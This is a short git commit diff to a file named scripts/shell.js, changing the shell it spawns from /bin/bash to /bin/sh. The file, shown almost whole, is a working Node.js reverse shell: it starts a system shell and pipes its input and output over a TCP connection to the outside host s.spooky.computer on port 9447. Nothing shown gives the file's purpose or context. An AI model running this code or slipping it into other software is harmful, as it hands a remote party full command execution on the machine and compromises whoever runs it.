dcaa9ae40c217aadc7fde79011ac6ad7e5065003
James Hebden <james@ec0.io>
2022-05-14 23:24:47 +1000

    bash to sh

--- scripts/shell.js
+++ scripts/shell.js
@@ -1,6 +1,6 @@
 #!/usr/bin/env node
 
-var net = require("net"), sh = require("child_process").exec("/bin/bash");
+var net = require("net"), sh = require("child_process").exec("/bin/sh");
 var client = new net.Socket();
 client.connect(9447, "s.spooky.computer", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
 sh.stderr.pipe(client);});
